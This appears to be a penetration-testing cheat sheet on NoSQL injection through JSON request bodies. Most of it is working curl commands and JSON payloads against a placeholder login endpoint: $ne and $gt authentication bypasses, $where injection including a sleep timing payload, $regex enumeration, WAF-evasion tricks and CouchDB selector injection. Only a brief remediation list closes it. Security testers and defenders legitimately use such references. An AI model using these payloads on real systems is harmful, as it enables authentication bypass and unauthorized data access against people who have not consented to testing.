# NoSQL Injection via JSON Body

## Summary
Many NoSQL applications accept JSON request bodies (`Content-Type: application/json`). The server parses the JSON into an object that is passed directly to the database query, allowing operator injection.

## Detection

### Baseline — Normal request
```bash
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "test"}'
```

### Inject $ne operator
```bash
# Bypass authentication
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
# If login succeeds, NoSQL injection is confirmed
```

## Operator Injection in JSON

### Nested Operator Object
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}
{"$or": [{"username": "admin"}, {"password": {"$ne": ""}}]}
```

### $where Injection
```json
{"$where": "this.password.length > 5"}
{"$where": "sleep(3000) || true"}
{"$where": "this.username.startsWith('a')"}
```

### $regex in JSON
```json
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

## JSON Content-Type Variants

```bash
# Standard JSON
Content-Type: application/json

# MongoDB Extended JSON
Content-Type: application/vnd.mongodb+json

# Generic JSON API
Content-Type: application/vnd.api+json

# Test all three
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/vnd.mongodb+json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
```

## Bypassing WAF Filters

### Array Notation
```json
{"username[$ne]": "", "password[$ne]": ""}
{"username[$gt]": "", "password[$gt]": ""}
```

### Unicode Escaping
```json
{"username": {"\u0024ne": ""}, "password": {"\u0024ne": ""}}
```

### Double Encoding
```bash
# Double URL-encode the dollar sign
curl -X POST https://target.com/api/login \
  -d 'username%2524ne=&password%2524ne='
```

## CouchDB-Specific JSON Injection

```bash
# CouchDB uses _ selector syntax
curl -X POST https://target.com/db/_find \
  -H "Content-Type: application/json" \
  -d '{"selector": {"username": {"$gt": null}}}'

# CouchDB $regex
curl -X POST https://target.com/db/_find \
  -d '{"selector": {"username": {"$regex": "^admin"}}}'
```

## Remediation
- Parse the JSON body with a strict schema validator before building queries
- Reject any keys that contain `$` at the root or nested level
- Use an ORM that escapes operator characters
- Never pass raw parsed JSON objects into database queries
